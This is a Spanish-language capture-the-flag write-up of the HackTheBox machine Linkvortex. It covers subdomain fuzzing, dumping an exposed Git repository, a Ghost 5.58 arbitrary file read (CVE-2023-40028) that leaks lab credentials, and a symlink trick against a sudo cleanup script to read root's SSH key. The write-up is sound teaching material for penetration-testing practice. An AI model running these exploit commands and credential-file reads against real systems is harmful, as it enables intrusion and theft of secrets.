# Linkvortex

![](../../../../~gitbook/image.md)Publicado: 07 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Linkvortex es una máquina Linux de dificultad Easy de HackTheBox que presenta un CMS Ghost vulnerable (versión 5.58) con una vulnerabilidad de lectura arbitraria de archivos (CVE-2023-40028). La escalada de privilegios se realiza mediante la explotación de un script personalizado que procesa enlaces simbólicos de forma insegura.
#### 🎯 Objetivos de Aprendizaje
- Enumeración web y descubrimiento de subdominios
- Explotación de repositorios Git expuestos
- Aprovechamiento de vulnerabilidades en Ghost CMS
- Lectura de archivos sensibles del sistema
- Escalada de privilegios mediante manipulación de enlaces simbólicos

#### 🏷️ Categorías
- Web Exploitation
- Information Disclosure
- Git Repository Enumeration
- Privilege Escalation
- Symlink Attack

#### 🛠️ Herramientas Utilizadas
- `nmap` - Escaneo de puertos y servicios
- `dirsearch` / `feroxbuster` - Fuzzing de directorios
- `ffuf` - Fuzzing de virtual hosts
- `git_dumper` - Extracción de repositorios Git
- Exploit CVE-2023-40028 para Ghost 5.58

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos TCP

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP (linkvortex.htb)
No encontramos gran cosa al enumerar el sitio de forma manual. La opción de registro no está implementada ni tampoco hay formularios en la web.![](../../../../~gitbook/image.md)
#### 👻 Identificación de Ghost CMS
Revisando el código fuente encontramos una etiqueta meta que hace referencia a Ghost 5.58![](../../../../~gitbook/image.md)Buscando información sobre este software encontré que es una aplicación para crear contenido, un CMS:
https://ghost.org/Al buscar información sobre este software también encontré que había tenido vulnerabilidades y en concreto parece que tuvo una vulnerabilidad de tipo Arbitrary File Read en la versión 5.58:https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028Pero echemos un ojo primero a ver si encontramos algo realizando fuzzing.
#### 📂 Fuzzing de directorios
Tras probar a realizar fuzzing de directorios con dirsearch y ferxobuster encontramos algunos recursos que añadir a nuestro scope:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Uno de ellos nos permite saber que hay un usuario admin, ya todos los post son de este usuario.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🔐 Panel de autenticación
Revisando el panel de login, nos pide una cuenta de correo como usuario. Si probamos con el nombre de usuario encontrado y el dominio vemos que parece ser válido, ya que si introducimos otro distinto el mensaje de error es diferente:http://linkvortex.htb/ghost![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Una opción a valorar sería usar hydra y un ataque de diccionario para ver si logramos la contraseña, pero como este probablemente sería un proceso largo, continuemos primero enumerando para ver si existen también otros subdominios.
#### 🔧 Subdominio de desarrollo (dev.linkvortex.htb)

#### Fuzzing de vhosts
Al realizr fuzzing de vhosts encontramos un subdominio llamado dev que procedemos a añadir a nuestro fichero /etc/hosts![](../../../../~gitbook/image.md)Al acceder encontramos que el sitio parece estar todavía en construcción![](../../../../~gitbook/image.md)
#### 📂 Fuzzing del subdominio dev
Al realizar fuzzing sobre este subdominio encontramos un repositorio en git:![](../../../../~gitbook/image.md)
#### ⬇️ Extracción del repositorio Git
Podemos usar la herramienta git_dumper para descargar el repositorio a nuestro host de ataque.![](../../../../~gitbook/image.md)
El repositorio está en un estado un poco extraño:![](../../../../~gitbook/image.md)
Actualmente no está en una rama, pero tiene dos archivos modificados pendientes de confirmación. Puedo ver la diferencia en cada uno de ellos usando git diff --cached. El Dockerfile.ghost es completamente nuevo:![](../../../../~gitbook/image.md)Vemos que hay un archivo de configuración en `/var/lib/ghost/config.production.json`
#### 🗝️ Descubrimiento de credenciales
Revisemos primero las diferencias del otro archivo que habíamos visto:![](../../../../~gitbook/image.md)La cosa se pone interesante porque aquí encontramos una contraseña. Vamos a probar esta contraseña `OctopiFociPilfer45` con la cuenta del usuario admin@linkvortex.htb y comprobemos si mereció la pena seguir enumerando en lugar de intentar el ataque de fuerza bruta con hydra:![](../../../../~gitbook/image.md)Estamos dentro! Esto se pone interesante, ya que el exploit que vimos para
#### 💥 Explotación
![](../../../../~gitbook/image.md)Ahora probemos con la ruta del fichero que habíamos descubierto en el archivo de configuración del repositorio en git: /var/lib/ghost/config.production.json
#### 🔐 Acceso SSH
Encontramos una nueva credencial: bob@linkvortex.htb:fibber-talented-worth en lo que parece ser un servicio SMTP. Pero tal como vemos, este servicio no está expuesto.Lo único que nos queda verificar es si se puede estar reutilizando esta credencial en algún otro servicio, por ejemplo el servicio ssh:![](../../../../~gitbook/image.md)Ganamos acceso a la máquina como usuario bob y obtenemos la primer flag en su directorio de usuario.
#### 🚀 Escalada de privilegios
Verificamos si bob puede ejecutar algún comando como root:
#### 📋 Análisis del script vulnerable
El script básicamente lo que hace es analizar un enlace simbólico (`symlink`) a una imagen `.png`, determinar si apunta a un archivo crítico (como algo en `/etc` o `/root`), y en ese caso eliminarlo o moverlo a cuarentena.Vamos paso a paso:Se define el directorio de cuarentena donde se moverán los enlaces sospechosos.Comprobación de variable opcional.- Si la variable de entorno `CHECK_CONTENT` no está definida, se le asigna el valor `false`.
- Esta variable indica si se debe imprimir el contenido del archivo al que apunta el symlink.
Captura del argumento introducido por el usuarioEn este if se valida la extensión del archivo que ha introducido el usuario.- Se verifica, usando `sudo`, si el archivo es un enlace simbólico (`-L`).
- Si no lo es, no hace nada (fin del script).
Se analiza el enlace simbólico.- `LINK_NAME`: obtiene solo el nombre del archivo (sin ruta).
- `LINK_TARGET`: obtiene a qué archivo apunta realmente el enlace.
Se comprueba si el enlace apunta a ficheros críticos del sistema:- Si el destino del enlace contiene `etc` o `root` (ej. `/etc/passwd` o `/root/.ssh/id_rsa`), lo considera peligroso.
- Imprime una advertencia y elimina el enlace simbólico con `unlink`.
Si no apunta a un archivo sensible, se mueve a la carpeta de cuarentena (`/var/quarantined`).- Si `CHECK_CONTENT` está activado, intenta leer el contenido del archivo al que apuntaba el enlace.

#### 🔗 Explotación mediante Symlink Attack
Primero, creamos un enlace simbólico (`symlink`) que apunte al archivo `/root/root.txt`:![](../../../../~gitbook/image.md)Con esto lo que estamos haciendo es crear un enlace simbólico llamado x3m1sec.txt que apunte al fichero /root/.ssh/id_rsa.txtRecordemos que el script requiere que el archivo que le indiquemos tenga extensión .png, por lo que creamos otro enlace simbólico![](../../../../~gitbook/image.md)- `ln -s /home/bob/x3m1sec.txt x3m1sec.png` → Creamos un segundo symlink (`x3m1sec.png`) que apunta a `x3m1sec.txt`, el cual a su vez apunta a `root.txt` logrando de esta forma evadir el filtro del script.
Nos falta un paso todavía, ya que necesitamos que la variable esté inicializada. `CHECK_CONTENT=true`¿Qué pasa aquí?- `CHECK_CONTENT=true` → Hace que el script muestre el contenido del archivo después de moverlo a `/var/quarantined/`.
- `/opt/ghost/clean_symlink.sh /home/bob/x3m1sec.png` → El script moverá el symlink y leerá su contenido.
![](../../../../~gitbook/image.md)Obtenemos la clave ssh de root. Ahora podemos copiarla en nuestro host de ataque, darle permisos 600 y ganar acceso como root para leer la flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.11.47
PING 10.10.11.47 (10.10.11.47) 56(84) bytes of data.
64 bytes from 10.10.11.47: icmp_seq=1 ttl=63 time=47.1 ms
64 bytes from 10.10.11.47: icmp_seq=2 ttl=63 time=47.0 ms

--- 10.10.11.47 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 46.983/47.062/47.142/0.079 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.47 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.11.47 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 20:12 CEST
Nmap scan report for 10.10.11.47
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts
```

```
dirsearch -u http://10.10.11.47 -x 503
```

```
feroxbuster -u http://linkvortex.htb -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```
ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -mc all -fs 230
```

```
dirsearch -u http://dev.linkvortex.htb -x 503
```

```
git_dumper http://dev.linkvortex.htb/.git/ git-dump-linkvortex
```

```
git status
```

```
git diff --cached Dockerfile.ghost
```

```
git diff --cached ghost/core/test/regression/api/admin/authentication.test.js
```

```
./CVE-2023-40028 -u admin@linkvortex.htb -p 'OctopiFociPilfer45' -h http://linkvortex.htb
```

```
File content:
{
"url": "http://localhost:2368",
"server": {
"port": 2368,
"host": "::"
},
"mail": {
"transport": "Direct"
},
"logging": {
"transports": ["stdout"]
},
"process": "systemd",
"paths": {
"contentPath": "/var/lib/ghost/content"
},
"spam": {
"user_login": {
"minWait": 1,
"maxWait": 604800000,
"freeRetries": 5000
}
},
"mail": {
"transport": "SMTP",
"options": {
"service": "Google",
"host": "linkvortex.htb",
"port": 587,
"auth": {
"user": "bob@linkvortex.htb",
"pass": "fibber-talented-worth"
}
}
}
}
```

```
netexec ssh 10.10.11.47 -u 'bob' -p 'fibber-talented-worth'
```

```
ssh bob@10.10.11.47
The authenticity of host '10.10.11.47 (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.47' (ED25519) to the list of known hosts.
bob@10.10.11.47's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Jun  7 17:36:35 2025 from 10.10.16.13
bob@linkvortex:~$ whoami
bob
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@linkvortex:~$
```

```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
bob@linkvortex:~$
```

```
bob@linkvortex:~$ ls -la /opt/ghost/clean_symlink.sh
-rwxr--r-- 1 root root 745 Nov  1  2024 /opt/ghost/clean_symlink.sh
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
```

```
# !/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
/usr/bin/echo "! First argument must be a png file !"
exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
LINK_NAME=$(/usr/bin/basename $LINK)
LINK_TARGET=$(/usr/bin/readlink $LINK)
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
/usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
/usr/bin/unlink $LINK
else
/usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
/usr/bin/mv $LINK $QUAR_DIR/
if $CHECK_CONTENT;then
/usr/bin/echo "Content:"
/usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
fi
fi
fi
```

```
QUAR_DIR="/var/quarantined"
```

```
if [ -z $CHECK_CONTENT ];then
CHECK_CONTENT=false
fi
```

```
LINK=$1
```

```
if ! [[ "$LINK" =~ \.png$ ]]; then
/usr/bin/echo "! First argument must be a png file !"
exit 2
fi

```

```
LINK_NAME=$(/usr/bin/basename $LINK)
LINK_TARGET=$(/usr/bin/readlink $LINK)
```

```
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
/usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
/usr/bin/unlink $LINK
```

```
else
/usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
/usr/bin/mv $LINK $QUAR_DIR/
```

```
if $CHECK_CONTENT;then
/usr/bin/echo "Content:"
/usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
fi
```

```
cd /home/bob
ln -s /root/.ssh/id_rsa x3m1sec.txt
```

```
ln -s /home/bob/x3m1sec.txt x3m1sec.png
```

```
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/x3m1sec.png
```

```
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.47
```
